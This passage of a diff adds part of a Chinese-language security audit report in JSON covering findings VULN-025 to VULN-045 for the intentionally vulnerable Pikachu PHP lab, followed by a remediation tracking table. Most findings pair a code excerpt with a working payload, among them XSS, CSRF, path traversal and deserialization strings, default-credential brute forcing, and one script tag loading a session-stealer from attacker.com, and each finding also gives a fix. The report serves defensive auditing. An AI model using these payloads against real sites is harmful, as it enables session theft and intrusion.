+        "description": "vul/dir/dir_list.php 将 GET 参数 title 直接拼接 require \"soup/$filename\"，可穿越目录包含任意 PHP 文件或读取文件内容（PHP 代码会执行，非 PHP 文件回显内容）。",
+        "evidence": [
+          { "label": "代码证据（dir_list.php:19-23）", "content": "$filename=$_GET['title'];\n//这里直接把传进来的内容进行了require(),造成问题\nrequire \"soup/$filename\";", "code": true },
+          { "label": "渗透验证 Payload", "content": "GET /vul/dir/dir_list.php?title=../../../inc/config.inc.php\n→ include 机制解析配置（PHP 输出被吞，可配合 php://filter 读源码）；结合上传的图片马可执行", "code": true },
+          { "label": "修复建议", "content": "文件白名单映射（如 soup/1.txt）；禁止 ../ 穿越（realpath 校验前缀）（P1）。", "code": false }
+        ],
+        "actual_fix": "",
+        "reference": "references/path_traversal_lfi_rfi.md"
+      },
+      {
+        "id": "VULN-026",
+        "title": "反射型 XSS（GET 参数直接输出）",
+        "severity": "Medium",
+        "owasp": "A03",
+        "stride": "STRIDE-T",
+        "status": "",
+        "section": "1",
+        "description": "vul/xss/xss_reflected_get.php 将 GET 参数 message 原样输出到 HTML，无任何编码，可直接执行脚本窃取会话。",
+        "evidence": [
+          { "label": "代码证据（xss_reflected_get.php:24-28）", "content": "if($_GET['message']=='kobe'){...}\n$html.=\"<p class='notice'>who is {$_GET['message']},i don't care!</p>\";", "code": true },
+          { "label": "渗透验证 Payload", "content": "GET /vul/xss/xss_reflected_get.php?message=<script>alert(document.cookie)</script>&submit=submit\n→ 弹窗回显 Cookie，证明脚本执行", "code": true },
+          { "label": "修复建议", "content": "输出前 htmlspecialchars($message, ENT_QUOTES)（P2）。", "code": false }
+        ],
+        "actual_fix": "",
+        "reference": "references/xss.md"
+      },
+      {
+        "id": "VULN-027",
+        "title": "反射型 XSS（POST 表单）",
+        "severity": "Medium",
+        "owasp": "A03",
+        "stride": "STRIDE-T",
+        "status": "",
+        "section": "1",
+        "description": "vul/xss/xsspost/xss_reflected_post.php 将 POST 参数 message 原样回显（需登录），可通过构造恶意表单诱导受害者提交触发。",
+        "evidence": [
+          { "label": "代码证据（xss_reflected_post.php:43-48）", "content": "//下面直接将前端输入的参数原封不动的输出了,出现xss\nif($_POST['message']=='kobe'){...}\n$html.=\"<p class='notice'>who is {$_POST['message']},i don't care!</p>\";", "code": true },
+          { "label": "渗透验证 Payload", "content": "<form method=post action=http://target/vul/xss/xsspost/xss_reflected_post.php>\n<input name=message value='<img src=x onerror=alert(1)>'><input name=submit value=submit>\n</form><script>document.forms[0].submit()</script>\n→ 受害者携带会话提交后执行脚本", "code": true },
+          { "label": "修复建议", "content": "输出转义 + 校验输入内容（P2）。", "code": false }
+        ],
+        "actual_fix": "",
+        "reference": "references/xss.md"
+      },
+      {
+        "id": "VULN-028",
+        "title": "反射型 XSS（script 标签过滤绕过）",
+        "severity": "Medium",
+        "owasp": "A03",
+        "stride": "STRIDE-T",
+        "status": "",
+        "section": "1",
+        "description": "vul/xss/xss_01.php 使用正则 /<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/ 过滤 script 关键字，但未用 i 修饰符且仅匹配小写路径，可大小写混写、使用 img/iframe 等其他标签绕过。",
+        "evidence": [
+          { "label": "代码证据（xss_01.php:21）", "content": "$message=preg_replace('/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/', '', $_GET['message']);", "code": true },
+          { "label": "渗透验证 Payload", "content": "GET /vul/xss/xss_01.php?message=<ScRiPt>alert(1)</ScRiPt>&submit=submit\nGET /vul/xss/xss_01.php?message=<img src=x onerror=alert(1)>&submit=submit\n→ 大小写绕过与标签替换均执行脚本", "code": true },
+          { "label": "修复建议", "content": "放弃正则黑名单，输出上下文编码（P2）。", "code": false }
+        ],
+        "actual_fix": "",
+        "reference": "references/xss.md"
+      },
+      {
+        "id": "VULN-029",
+        "title": "反射型 XSS（htmlspecialchars 默认参数 + 属性注入）",
+        "severity": "Medium",
+        "owasp": "A03",
+        "stride": "STRIDE-T",
+        "status": "",
+        "section": "1",
+        "description": "vul/xss/xss_02.php 使用 htmlspecialchars 但未传 ENT_QUOTES（默认不转义单引号），且输出位于 a 标签 href 属性（单引号包裹），可闭合属性注入事件或 javascript 协议。",
+        "evidence": [
+          { "label": "代码证据（xss_02.php:26-30）", "content": "$message=htmlspecialchars($_GET['message']); // 默认不处理单引号\n$html2.=\"<a href='{$message}'>{$message}</a>\";", "code": true },
+          { "label": "渗透验证 Payload", "content": "GET /vul/xss/xss_02.php?message=' onclick='alert(1)&submit=submit\nGET /vul/xss/xss_02.php?message=javascript:alert(1)&submit=submit\n→ 单引号逃逸注入事件处理函数/协议", "code": true },
+          { "label": "修复建议", "content": "htmlspecialchars($msg, ENT_QUOTES) + URL 协议白名单（P2）。", "code": false }
+        ],
+        "actual_fix": "",
+        "reference": "references/xss.md"
+      },
+      {
+        "id": "VULN-030",
+        "title": "反射型 XSS（href javascript 协议）",
+        "severity": "Medium",
+        "owasp": "A03",
+        "stride": "STRIDE-T",
+        "status": "",
+        "section": "1",
+        "description": "vul/xss/xss_03.php 虽使用 htmlspecialchars(ENT_QUOTES) 正确转义引号，但输出位置为 a 标签 href，未校验 URL 协议，javascript: 协议仍可执行代码。",
+        "evidence": [
+          { "label": "代码证据（xss_03.php:29-30）", "content": "$message=htmlspecialchars($_GET['message'],ENT_QUOTES);\n$html.=\"<a href='{$message}'> 阁下自己输入的url还请自己点一下吧</a>\";", "code": true },
+          { "label": "渗透验证 Payload", "content": "GET /vul/xss/xss_03.php?message=javascript:alert(document.cookie)&submit=submit\n→ 点击链接执行脚本；引号转义不影响协议注入", "code": true },
+          { "label": "修复建议", "content": "URL 协议白名单校验（仅 http/https），再做输出编码（P2）。", "code": false }
+        ],
+       "actual_fix": "",
+        "reference": "references/xss.md"
+      },
+      {
+        "id": "VULN-031",
+        "title": "反射型 XSS（JavaScript 上下文输出）",
+        "severity": "Medium",
+        "owasp": "A03",
+        "stride": "STRIDE-T",
+        "status": "",
+        "section": "1",
+        "description": "vul/xss/xss_04.php 将 GET 参数 message 直接输出到 <script> 块内的 JS 变量赋值处，未做 JS 转义（htmlspecialchars 对 JS 上下文无效），可闭合 JS 字符串执行任意脚本。",
+        "evidence": [
+          { "label": "代码证据（xss_04.php:33 + 81）", "content": "$jsvar=$_GET['message'];\n<script>\n    $ms='<?php echo $jsvar;?>';\n</script>", "code": true },
+          { "label": "渗透验证 Payload", "content": "GET /vul/xss/xss_04.php?message=';alert(document.cookie);//&submit=submit\n→ 闭合单引号与语句，执行任意 JS", "code": true },
+          { "label": "修复建议", "content": "JS 上下文输出使用 json_encode / addslashes + 十六进制转义；代码注释已给出正确方案（P2）。", "code": false }
+        ],
+        "actual_fix": "",
+        "reference": "references/xss.md"
+      },
+      {
+        "id": "VULN-032",
+        "title": "DOM 型 XSS（innerHTML 拼接）",
+        "severity": "Medium",
+        "owasp": "A03",
+        "stride": "STRIDE-T",
+        "status": "",
+        "section": "1",
+        "description": "vul/xss/xss_dom.php 前端 JS 将用户输入直接拼入 innerHTML 的 a 标签，DOM 上下文无任何过滤，注释中即给出可利用 payload。",
+        "evidence": [
+          { "label": "代码证据（xss_dom.php:48-54）", "content": "function domxss(){\n    var str = document.getElementById(\"text\").value;\n    document.getElementById(\"dom\").innerHTML = \"<a href='\"+str+\"'>what do you see?</a>\";\n}\n//试试：'><img src=\"#\" onmouseover=\"alert('xss')\">", "code": true },
+          { "label": "渗透验证 Payload", "content": "输入：'><img src=# onmouseover=alert(document.cookie)>\n→ 闭合 href 属性后注入 img 标签，鼠标悬停触发脚本", "code": true },
+          { "label": "修复建议", "content": "禁止 innerHTML 拼接用户输入；使用 textContent 或 DOM API 构建节点 + URL 协议校验（P2）。", "code": false }
+        ],
+        "actual_fix": "",
+        "reference": "references/xss.md"
+      },
+      {
+        "id": "VULN-033",
+        "title": "存储型 XSS（盲打，管理员后台触发）",
+        "severity": "Medium",
+        "owasp": "A03",
+        "stride": "STRIDE-T",
+        "status": "",
+        "section": "1",
+        "description": "vul/xss/xssblind/xss_blind.php 反馈提交仅做 SQL 转义存储；管理员后台 admin.php 列表输出 content/name 未做 HTML 转义，攻击者提交恶意脚本后，管理员一打开后台即被攻击（XSS 盲打），可窃取管理员会话。",
+        "evidence": [
+          { "label": "代码证据（xss_blind.php:25-29 + admin.php:85-94）", "content": "$content=escape($link, $_POST['content']);\n$query=\"insert into xssblind(time,content,name) values(...)\";\n// admin.php 列表：\n<td>{$data['content']}</td><td>{$data['name']}</td> // 未转义输出", "code": true },
+          { "label": "渗透验证 Payload", "content": "POST /vul/xss/xssblind/xss_blind.php\n\ncontent=<script src=http://attacker.com/steal.js></script>&name=admin&submit=submit\n→ 管理员登录 /vul/xss/xssblind/admin_login.php 查看反馈即触发，窃取后台会话", "code": true },
+          { "label": "修复建议", "content": "后台输出 htmlspecialchars + 后台 Cookie 加 HttpOnly（P2）。", "code": false }
+        ],
+        "actual_fix": "",
+        "reference": "references/xss.md"
+      },
+      {
+        "id": "VULN-034",
+        "title": "反射型 XSS（搜索页面回显）",
+        "severity": "Medium",
+        "owasp": "A03",
+        "stride": "STRIDE-T",
+        "status": "",
+        "section": "1",
+        "description": "vul/sqli/sqli_search.php 将搜索关键字 $_GET['name'] 未转义回显在搜索结果标题中（代码注释标注彩蛋），与搜索型 SQL 注入同源，独立构成反射 XSS。",
+        "evidence": [
+          { "label": "代码证据（sqli_search.php:33-34）", "content": "//彩蛋:这里还有个xss\n$html2.=\"<p class='notice'>用户名中含有{$_GET['name']}的结果如下：\";", "code": true },
+          { "label": "渗透验证 Payload", "content": "GET /vul/sqli/sqli_search.php?submit=1&name=<script>alert(document.cookie)</script>\n→ 搜索即回显脚本并执行", "code": true },
+          { "label": "修复建议", "content": "输出 htmlspecialchars（P2）。", "code": false }
+        ],
+        "actual_fix": "",
+        "reference": "references/xss.md"
+      },
+      {
+        "id": "VULN-035",
+        "title": "不安全反序列化（对象注入 + 反射 XSS）",
+        "severity": "Medium",
+        "owasp": "A08",
+        "stride": "STRIDE-E/T",
+        "status": "",
+        "section": "1",
+        "description": "vul/unserilization/unser.php 将 POST 参数 o 直接传入 unserialize()，类 S 的 __construct 会输出可控属性，可注入恶意序列化对象触发 XSS；若应用存在危险魔法方法（__destruct/__wakeup）即可升级为 RCE。",
+        "evidence": [
+          { "label": "代码证据（unser.php:18-34）", "content": "class S{ var $test = \"pikachu\"; function __construct(){ echo $this->test; } }\nif(isset($_POST['o'])){\n    $s = $_POST['o'];\n    if(!@$unser = unserialize($s)){...}\n    else{ $html.=\"<p>{$unser->test}</p>\"; }", "code": true },
+          { "label": "渗透验证 Payload", "content": "POST /vul/unserilization/unser.php\n\no=O:1:\"S\":1:{s:4:\"test\";s:29:\"<script>alert('xss')</script>\";}&submit=提交\n→ 构造对象触发 __construct 输出脚本；注释中已给出同样 payload", "code": true },
+          { "label": "修复建议", "content": "禁止反序列化不可信数据；使用白名单允许类（allowed_classes）；JSON 替代序列化协议（P2）。", "code": false }
+        ],
+        "actual_fix": "",
+        "reference": "references/insecure_deserialization.md"
+      },
+      {
+        "id": "VULN-036",
+        "title": "CSRF - 修改个人资料无令牌校验（GET/POST）",
+        "severity": "Medium",
+        "owasp": "A01",
+        "stride": "STRIDE-T",
+        "status": "",
+        "section": "1",
+        "description": "vul/csrf/csrfget/csrf_get_edit.php 与 csrfpost/csrf_post_edit.php 资料修改接口均无 CSRF Token 校验（对比 csrftoken 模块有 set_token 校验），GET 型可被 <img> 标签直接触发，POST 型可被自动提交表单触发，受害者在登录态下点击恶意页面即被篡改资料。",
+        "evidence": [
+          { "label": "代码证据（csrf_get_edit.php:30-34）", "content": "if(isset($_GET['submit'])){\n    if($_GET['sex']!=null && ...){\n        $getdata=escape($link, $_GET); // 无 token 校验\n        $query=\"update member set sex='{$getdata['sex']}',...\";", "code": true },
+          { "label": "渗透验证 Payload", "content": "<img src=\"http://target/vul/csrf/csrfget/csrf_get_edit.php?sex=hacker&phonenum=1&add=1&email=h@x.com&submit=submit\">\n→ 受害者登录状态下访问含此标签页面即被修改资料（GET 型无需交互）", "code": true },
+          { "label": "修复建议", "content": "敏感操作加 CSRF Token（参照 csrftoken 模块写法：set_token + 表单 hidden + 服务端比对）；改 POST + SameSite Cookie（P2）。", "code": false }
+        ],
+        "actual_fix": "",
+        "reference": "references/csrf.md"
+      },
+      {
+        "id": "VULN-037",
+        "title": "验证码防护完全失效（明文写入 Cookie + 不失效 + 无锁定）",
+        "severity": "Medium",
+        "owasp": "A07",
+        "stride": "STRIDE-S",
+        "status": "",
+        "section": "1",
+        "description": "inc/showvcode.php 将验证码明文写入 Cookie bf[vcode]（代码注释自述问题），bf_server.php 校验后不销毁验证码可无限重放，且全站无账号锁定/失败计数/速率限制，攻击者可无限暴力破解默认账号口令。",
+        "evidence": [
+          { "label": "代码证据（showvcode.php:5-7 + bf_server.php:36-53）", "content": "$_SESSION['vcode']=vcodex();\nsetcookie('bf[vcode]',$_SESSION['vcode']); // 验证码明文给前端\nif (strtolower($_POST['vcode']) != strtolower($_SESSION['vcode'])) {...}\n//虽然前面做了为空判断,但最后,却没有验证验证码!!!（验证码校验后未销毁）", "code": true },
+          { "label": "渗透验证 Payload", "content": "① 访问 /inc/showvcode.php 获取 Cookie bf[vcode]=验证码明文；② 携 Cookie 与验证码对 /vul/burteforce/bf_server.php 批量提交字典（admin/123456、pikachu/000000、test/abc123 均在 install.php 初始化数据中）；③ 验证码不失效、无锁定，可无限尝试。", "code": true },
+          { "label": "修复建议", "content": "验证码仅存服务端 Session 并一次性使用（校验后 unset）；登录失败计数 + 锁定/退避；验证码图片防 OCR（P2）。", "code": false }
+        ],
+        "actual_fix": "",
+        "reference": "references/brute_force.md"
+      },
+      {
+        "id": "VULN-038",
+        "title": "安装脚本未受保护（可重复初始化重置数据库）",
+        "severity": "Medium",
+        "owasp": "A04",
+        "stride": "STRIDE-D/T",
+        "status": "",
+        "section": "2",
+        "description": "install.php 无任何鉴权/一次性校验，任意访问者 POST 提交即执行 drop database if exists 并重建库表，部署后未删除该文件可导致数据被远程清空重置。",
+        "evidence": [
+          { "label": "代码证据（install.php:17-33）", "content": "if(isset($_POST['submit'])){\n    if(!@mysqli_connect($dbhost, $dbuser, $dbpw)){ exit(...); }\n    $drop_db=\"drop database if exists $dbname\";\n    if(!@mysqli_query($link, $drop_db)){ exit(...); }\n    $create_db=\"CREATE DATABASE $dbname\";", "code": true },
+          { "label": "利用方式", "content": "① 部署后访问 /install.php；② 点击\"安装/初始化\"按钮；③ 数据库被 drop 重建，全部业务数据丢失；同时创建含已知密码（admin/123456 等）的默认账号。", "code": false },
+          { "label": "修复建议", "content": "安装完成后自动删除 install.php；安装流程加一次性安装锁文件（P2）。", "code": false }
+        ],
+        "actual_fix": "",
+        "reference": "references/default_credentials.md"
+      },
+      {
+        "id": "VULN-039",
+        "title": "默认/弱口令账号（admin/123456 等公开于页面）",
+        "severity": "Low",
+        "owasp": "A07",
+        "stride": "STRIDE-S",
+        "status": "",
+        "section": "2",
+        "description": "install.php 初始化 admin/123456、pikachu/000000、test/abc123 三个账号；pkxss 后台登录页明文展示默认口令 admin/123456；brute force 模块提示\"用户还是那三个默认用户\"，攻击者无需爆破即可登录管理后台。",
+        "evidence": [
+          { "label": "代码证据（install.php:54 + pkxss_login.php:55）", "content": "insert into `users` values (1,'admin',md5('123456'),1),(2,'pikachu',md5('000000'),2),(3,'test',md5('abc123'),3)\n<p>admin/123456</p> // pkxss 登录页直接显示默认口令", "code": true },
+          { "label": "利用方式", "content": "直接以 admin/123456 登录 pkxss 后台（xssmanager.php），查看全部被窃取的 Cookie/键盘记录/钓鱼数据；以 test/abc123 登录 op2 模块获得普通用户权限。", "code": false },
+          { "label": "修复建议", "content": "首次启动强制修改默认口令；生产部署移除测试账号；禁止在页面展示凭据（P3）。", "code": false }
+        ],
+        "actual_fix": "",
+        "reference": "references/default_credentials.md"
+      },
+      {
+        "id": "VULN-040",
+        "title": "开放重定向",
+        "severity": "Low",
+        "owasp": "A01",
+        "stride": "STRIDE-S",
+        "status": "",
+        "section": "1",
+        "description": "vul/urlredirect/urlredirect.php 将 GET 参数 url 直接作为 header(location:) 跳转目标，无协议/域名白名单校验，可被用于钓鱼（借平台可信域名跳转恶意站点）。",
+        "evidence": [
+          { "label": "代码证据（urlredirect.php:18-24）", "content": "$url = $_GET['url'];\nif($url == 'i'){ $html.=\"<p>好的...\"; }\nelse { header(\"location:{$url}\"); }", "code": true },
+          { "label": "渗透验证 Payload", "content": "GET /vul/urlredirect/urlredirect.php?url=https://evil.com/phish\n→ 302 跳转至钓鱼站点，浏览器地址栏显示受害域名", "code": true },
+          { "label": "修复建议", "content": "跳转目标白名单（同域校验或配置表）；禁止绝对 URL 跳转（P3）。", "code": false }
+        ],
+        "actual_fix": "",
+        "reference": "references/open_redirect.md"
+      },
+      {
+        "id": "VULN-041",
+        "title": "用户枚举 + 弱哈希 Cookie 认证（MD5）",
+        "severity": "Low",
+        "owasp": "A07",
+        "stride": "STRIDE-S/I",
+        "status": "",
+        "section": "2",
+        "description": "vul/infoleak/findabc.php 登录对账号不存在与密码错误返回不同提示，可枚举有效用户名；登录成功后 Cookie 以明文用户名 + MD5(密码) 形式下发（10 小时有效），可离线碰撞还原口令。",
+        "evidence": [
+          { "label": "代码证据（findabc.php:34-46）", "content": "setcookie('abc[uname]',$_GET['username'],time()+36000);\nsetcookie('abc[pw]',md5($_GET['password']),time()+36000);\nif(mysqli_num_rows($res_user) == 1){\n    $html.=\"<p>您输入的密码错误</p>\"; }else{\n    $html.=\"<p>您输入的账号错误</p>\"; } // 枚举差异", "code": true },
+          { "label": "利用方式", "content": "① 批量探测用户名（提示差异枚举）；② 截获 Cookie 后对 MD5 值彩虹表碰撞还原密码；③ MD5 值可离线验证口令。", "code": false },
+          { "label": "修复建议", "content": "统一登录失败提示；Cookie 仅存会话标识；密码哈希升级 bcrypt/argon2（P3）。", "code": false }
+        ],
+        "actual_fix": "",
+        "reference": "references/weak_crypto_hash.md"
+      },
+      {
+        "id": "VULN-042",
+        "title": "敏感信息泄露 - phpinfo 页面暴露",
+        "severity": "Low",
+        "owasp": "A05",
+        "stride": "STRIDE-I",
+        "status": "",
+        "section": "2",
+        "description": "phpinfo.php 与 test/phpinfo.txt 直接暴露 phpinfo() 输出（PHP 版本、配置路径、扩展、环境变量等），泄露服务器内部信息，辅助漏洞利用。",
+        "evidence": [
+          { "label": "代码证据（phpinfo.php:1 / test/phpinfo.txt）", "content": "<?php phpinfo(); ?>\n→ 直接访问 /phpinfo.php 返回完整 PHP 配置信息", "code": true },
+          { "label": "利用方式", "content": "访问 /phpinfo.php 获取：PHP 版本（针对性 CVE）、disable_functions 列表（判断可利用函数）、扩展与配置路径、环境变量。", "code": false },
+          { "label": "修复建议", "content": "删除 phpinfo 类文件；生产环境关闭 display_errors（P3）。", "code": false }
+        ],
+        "actual_fix": "",
+        "reference": "references/information_disclosure.md"
+      },
+      {
+        "id": "VULN-043",
+        "title": "SQL 错误信息直接回显（辅助注入利用）",
+        "severity": "Low",
+        "owasp": "A05",
+        "stride": "STRIDE-I",
+        "status": "",
+        "section": "2",
+        "description": "inc/mysql.inc.php execute() 在 SQL 执行出错时直接 exit(mysqli_error($link)) 输出原始错误信息（含表结构、字段、SQL 片段），配合 Dockerfile 开启 display_errors，为注入利用提供报错回显通道。",
+        "evidence": [
+          { "label": "代码证据（mysql.inc.php:18-24 + Dockerfile:16）", "content": "function execute($link,$query){\n    $result=mysqli_query($link,$query);\n    if(mysqli_errno($link)){\n        exit(mysqli_error($link));//有错误，返回编码，为true，则打印报错信息\n    }\n    return $result;\n}\n# Dockerfile: sed -i '/display_errors/s/Off/On/g' /etc/php/7.4/apache2/php.ini", "code": true },
+          { "label": "利用方式", "content": "提交非法 SQL 触发错误 → 页面回显 MySQL 原始报错（表/列/语法），加速注入点确认与报错注入利用（如 updatexml）。", "code": false },
+          { "label": "修复建议", "content": "生产关闭 display_errors，错误记日志；自定义统一错误页（P3）。", "code": false }
+        ],
+        "actual_fix": "",
+        "reference": "references/information_disclosure.md"
+      },
+      {
+        "id": "VULN-044",
+        "title": "数据库连接凭证硬编码于源码",
+        "severity": "Low",
+        "owasp": "A07",
+        "stride": "STRIDE-S",
+        "status": "",
+        "section": "2",
+        "description": "inc/config.inc.php 硬编码数据库账号密码（pikachu/123456），源码泄露即数据库失守；Dockerfile 进一步将 DB 密码清空并开启 MySQL 空密码登录（AllowNoPassword=true）。",
+        "evidence": [
+          { "label": "代码证据（config.inc.php:9-13 + Dockerfile:12）", "content": "define('DBUSER', 'pikachu');\ndefine('DBPW', '123456');\ndefine('DBNAME', 'pikachu');\n# Dockerfile: sed -i '/AllowNoPassword/s/false/true/g' ...config.inc.php", "code": true },
+          { "label": "修复建议", "content": "凭证改环境变量注入；数据库最小权限账号；禁止空密码（P3）。", "code": false }
+        ],
+        "actual_fix": "",
+        "reference": "references/php_security.md"
+      },
+      {
+        "id": "VULN-045",
+        "title": "缺少安全响应头（CSP/X-Frame-Options 等）",
+        "severity": "Info",
+        "owasp": "A05",
+        "stride": "STRIDE-T",
+        "status": "",
+        "section": "2",
+        "description": "header.php 未设置 Content-Security-Policy、X-Frame-Options、X-Content-Type-Options 等安全响应头，XSS 无纵深防御、页面可被 iframe 嵌入（点击劫持）。",
+        "evidence": [
+          { "label": "代码证据（header.php 响应头设置）", "content": "header.php 仅输出 HTML，未设置任何安全响应头；XSS 类漏洞（VULN-021/026~034）均无 CSP 兜底", "code": true },
+          { "label": "修复建议", "content": "全局响应加 CSP（script-src 'self'）、X-Frame-Options: DENY、X-Content-Type-Options: nosniff（P3）。", "code": false }
+        ],
+        "actual_fix": "",
+        "reference": "references/information_disclosure.md"
+      }
+    ],
+    "tracking": [
+      { "level": "Critical严重", "seq": 1, "name": "远程代码执行漏洞（eval 注入）", "detail": "rce_eval.php 任意 PHP 代码执行", "id": "VULN-001", "fix": "禁用 eval，改白名单函数映射", "status": "", "retest": "" },
+      { "level": "Critical严重", "seq": 2, "name": "命令注入漏洞", "detail": "rce_ping.php shell_exec 拼接命令执行", "id": "VULN-002", "fix": "IP 严格格式校验，禁用危险函数", "status": "", "retest": "" },
+      { "level": "Critical严重", "seq": 3, "name": "任意文件上传漏洞", "detail": "clientcheck.php 仅前端校验，可上传 webshell", "id": "VULN-003", "fix": "服务端扩展名白名单+内容校验+目录禁执行", "status": "", "retest": "" },
+      { "level": "Critical严重", "seq": 4, "name": "后门/恶意文件漏洞", "detail": "test/yijuhua.php 一句话木马写入脚本", "id": "VULN-004", "fix": "删除 test 目录，发布流程加恶意文件扫描", "status": "", "retest": "" },
+      { "level": "High高危", "seq": 5, "name": "SQL注入漏洞（数字型）", "detail": "sqli_id.php id 参数直接拼接", "id": "VULN-005", "fix": "预处理语句+数字强校验", "status": "", "retest": "" },
+      { "level": "High高危", "seq": 6, "name": "SQL注入漏洞（字符型）", "detail": "sqli_str/sqli_x 用户名参数拼接", "id": "VULN-006", "fix": "参数化查询", "status": "", "retest": "" },
+      { "level": "High高危", "seq": 7, "name": "SQL注入漏洞（搜索型）", "detail": "sqli_search.php LIKE 拼接", "id": "VULN-007", "fix": "LIKE 参数化+通配符转义", "status": "", "retest": "" },
+      { "level": "High高危", "seq": 8, "name": "SQL注入漏洞（Delete型）", "detail": "sqli_del.php id 参数拼接 DELETE", "id": "VULN-008", "fix": "参数化+is_numeric 强校验", "status": "", "retest": "" },
+      { "level": "High高危", "seq": 9, "name": "SQL注入漏洞（Insert型）", "detail": "sqli_reg.php 注册字段未转义拼接", "id": "VULN-009", "fix": "插入参数化+字段白名单", "status": "", "retest": "" },
+      { "level": "High高危", "seq": 10, "name": "SQL注入漏洞（Update型）", "detail": "sqli_edit.php 资料修改字段拼接", "id": "VULN-010", "fix": "UPDATE 参数化+身份绑定", "status": "", "retest": "" },
+      { "level": "High高危", "seq": 11, "name": "SQL注入漏洞（盲注）", "detail": "sqli_blind_b/t 布尔与时间盲注", "id": "VULN-011", "fix": "参数化查询+慢查询监控", "status": "", "retest": "" },
+      { "level": "High高危", "seq": 12, "name": "SQL注入漏洞（宽字节）", "detail": "sqli_widebyte.php GBK 编码绕过转义", "id": "VULN-012", "fix": "统一 utf8 编码+预处理语句", "status": "", "retest": "" },
+      { "level": "High高危", "seq": 13, "name": "SQL注入漏洞（HTTP头）", "detail": "sqli_header.php UA/Accept 头拼接入库", "id": "VULN-013", "fix": "请求头参数化存储", "status": "", "retest": "" },
+      { "level": "High高危", "seq": 14, "name": "SQL注入漏洞（Cookie认证绕过）", "detail": "check_sqli_login cookie 未转义拼接", "id": "VULN-014", "fix": "会话标识随机化，认证查询参数化", "status": "", "retest": "" },
+      { "level": "High高危", "seq": 15, "name": "文件包含漏洞（LFI）", "detail": "fi_local.php filename 直接 include", "id": "VULN-015", "fix": "包含白名单+禁用 php:// 包装器", "status": "", "retest": "" },
+      { "level": "High高危", "seq": 16, "name": "文件包含漏洞（RFI）", "detail": "fi_remote.php 远程包含+allow_url_include=On", "id": "VULN-016", "fix": "关闭 allow_url_include+包含白名单", "status": "", "retest": "" },
+      { "level": "High高危", "seq": 17, "name": "XXE漏洞（任意文件读取）", "detail": "xxe_1.php LIBXML_NOENT 外部实体", "id": "VULN-017", "fix": "禁用外部实体解析", "status": "", "retest": "" },
+      { "level": "High高危", "seq": 18, "name": "SSRF漏洞（curl回显）", "detail": "ssrf_curl.php 任意 URL 请求并回显", "id": "VULN-018", "fix": "协议白名单+内网段黑名单", "status": "", "retest": "" },
+      { "level": "High高危", "seq": 19, "name": "SSRF/任意文件读取漏洞", "detail": "ssrf_fgc.php file_get_contents 回显", "id": "VULN-019", "fix": "协议白名单+路径校验", "status": "", "retest": "" },
+      { "level": "High高危", "seq": 20, "name": "任意文件上传漏洞（MIME绕过）", "detail": "servercheck.php 仅 MIME 校验", "id": "VULN-020", "fix": "扩展名白名单+getimagesize 双重校验", "status": "", "retest": "" },
+      { "level": "High高危", "seq": 21, "name": "存储型XSS漏洞", "detail": "xss_stored.php 留言输出未转义", "id": "VULN-021", "fix": "输出 htmlspecialchars(ENT_QUOTES)", "status": "", "retest": "" },
+      { "level": "High高危", "seq": 22, "name": "垂直越权漏洞", "detail": "op2_admin 仅验证登录未验证级别", "id": "VULN-022", "fix": "受保护页面校验 level 权限", "status": "", "retest": "" },
+      { "level": "High高危", "seq": 23, "name": "IDOR水平越权漏洞", "detail": "op1_mem.php GET username 查他人信息", "id": "VULN-023", "fix": "查询绑定会话身份", "status": "", "retest": "" },
+      { "level": "High高危", "seq": 24, "name": "任意文件下载漏洞", "detail": "execdownload.php filename 路径遍历", "id": "VULN-024", "fix": "basename+目录白名单", "status": "", "retest": "" },
+      { "level": "High高危", "seq": 25, "name": "目录遍历漏洞", "detail": "dir_list.php title 直接 require", "id": "VULN-025", "fix": "文件白名单映射", "status": "", "retest": "" },
+      { "level": "Medium中危", "seq": 26, "name": "反射型XSS漏洞（GET）", "detail": "xss_reflected_get.php 直接输出", "id": "VULN-026", "fix": "输出 htmlspecialchars", "status": "", "retest": "" },
+      { "level": "Medium中危", "seq": 27, "name": "反射型XSS漏洞（POST）", "detail": "xss_reflected_post.php 直接输出", "id": "VULN-027", "fix": "输出转义+输入校验", "status": "", "retest": "" },
+      { "level": "Medium中危", "seq": 28, "name": "反射型XSS漏洞（过滤绕过）", "detail": "xss_01.php script 正则可绕过", "id": "VULN-028", "fix": "输出上下文编码", "status": "", "retest": "" },
+      { "level": "Medium中危", "seq": 29, "name": "反射型XSS漏洞（属性注入）", "detail": "xss_02.php 单引号未转义+href属性", "id": "VULN-029", "fix": "ENT_QUOTES+协议白名单", "status": "", "retest": "" },
+      { "level": "Medium中危", "seq": 30, "name": "反射型XSS漏洞（javascript协议）", "detail": "xss_03.php href 未校验协议", "id": "VULN-030", "fix": "URL 协议白名单", "status": "", "retest": "" },
+      { "level": "Medium中危", "seq": 31, "name": "反射型XSS漏洞（JS上下文）", "detail": "xss_04.php JS 变量未转义", "id": "VULN-031", "fix": "JS 上下文 json_encode 转义", "status": "", "retest": "" },
+      { "level": "Medium中危", "seq": 32, "name": "DOM型XSS漏洞", "detail": "xss_dom.php innerHTML 拼接", "id": "VULN-032", "fix": "textContent+DOM API 构建", "status": "", "retest": "" },
+      { "level": "Medium中危", "seq": 33, "name": "存储型XSS漏洞（盲打）", "detail": "xss_blind 后台列表未转义", "id": "VULN-033", "fix": "后台输出转义+Cookie HttpOnly", "status": "", "retest": "" },
+      { "level": "Medium中危", "seq": 34, "name": "反射型XSS漏洞（搜索回显）", "detail": "sqli_search.php 搜索词未转义", "id": "VULN-034", "fix": "输出 htmlspecialchars", "status": "", "retest": "" },
+      { "level": "Medium中危", "seq": 35, "name": "不安全反序列化漏洞", "detail": "unser.php 直接 unserialize 用户输入", "id": "VULN-035", "fix": "禁止反序列化不可信数据", "status": "", "retest": "" },
+      { "level": "Medium中危", "seq": 36, "name": "CSRF漏洞", "detail": "csrf_get/post_edit 无 token 校验", "id": "VULN-036", "fix": "CSRF Token+SameSite Cookie", "status": "", "retest": "" },
+      { "level": "Medium中危", "seq": 37, "name": "验证码绕过/暴力破解漏洞", "detail": "验证码明文 Cookie+不失效+无锁定", "id": "VULN-037", "fix": "验证码仅存 Session 一次性使用+登录锁定", "status": "", "retest": "" },
+      { "level": "Medium中危", "seq": 38, "name": "安装脚本未防护漏洞", "detail": "install.php 可重复初始化重置数据库", "id": "VULN-038", "fix": "安装后删除 install.php+安装锁", "status": "", "retest": "" },
